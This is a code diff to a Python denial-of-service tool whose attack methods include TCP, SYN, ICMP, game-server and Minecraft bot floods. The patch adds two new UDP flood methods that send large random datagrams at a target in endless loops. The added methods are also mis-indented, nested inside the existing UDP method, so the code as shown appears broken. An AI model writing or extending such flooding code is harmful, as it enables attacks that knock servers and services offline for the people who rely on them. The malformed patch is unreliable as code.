@@ -128,7 +128,7 @@ class Methods:
     LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
                                 "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
                                 "MCBOT", "CONNECTION", "CPS", "FIVEM",
-                                "TS3", "MCPE", "ICMP"
+                                "TS3", "MCPE", "ICMP" , "UDP2" , "UDP3"
                                 }
 
     ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
@@ -395,6 +395,8 @@ class Layer4(Thread):
 
         self.methods = {
             "UDP": self.UDP,
+            "UDP2": self.UDP2,
+            "UDP3": self.UDP3,
             "SYN": self.SYN,
             "VSE": self.VSE,
             "TS3": self.TS3,
@@ -466,9 +468,24 @@ class Layer4(Thread):
     def UDP(self) -> None:
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, randbytes(65495), self._target):
+            while Tools.sendto(s, randbytes(4096), self._target):
                 continue
         Tools.safe_close(s)
+
+            def UDP2(self) -> None:
+                s = None
+                with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
+                    while Tools.sendto(s, randbytes(32517), self._target):
+                        continue
+                Tools.safe_close(s)
+
+
+                    def UDP3(self) -> None:
+                        s = None
+                        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
+                            while Tools.sendto(s, randbytes(65495), self._target):
+                                continue
+                        Tools.safe_close(s)
 
     def ICMP(self) -> None:
         payload = self._genrate_icmp()
@@ -508,7 +525,7 @@ class Layer4(Thread):
             username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
             password = b64encode(username.encode()).decode()[:8].title()
             Tools.send(s, Minecraft.login(self.protocolid, username))
-            
+
             sleep(1.5)
 
             Tools.send(s, Minecraft.chat(self.protocolid, "/register %s %s" % (password, password)))
@@ -777,7 +794,7 @@ class HttpFlood(Thread):
         for key, value in self.methods.items():
             if name == key:
                 self.SENT_FLOOD()
-                
+
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
         self.select(self._method)
@@ -1687,9 +1704,9 @@ if __name__ == '__main__':
 
                         else:
                             logger.setLevel("DEBUG")
-                
+
                 protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
-                
+
                 if method == "MCBOT":
                     with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                         Tools.send(s, Minecraft.handshake((target, port), protocolid, 1))
@@ -1697,7 +1714,7 @@ if __name__ == '__main__':
 
                         protocolid = Tools.protocolRex.search(str(s.recv(1024)))
                         protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"] if not protocolid else int(protocolid.group(1))
-                        
+
                         if 47 < protocolid > 758:
                             protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
 
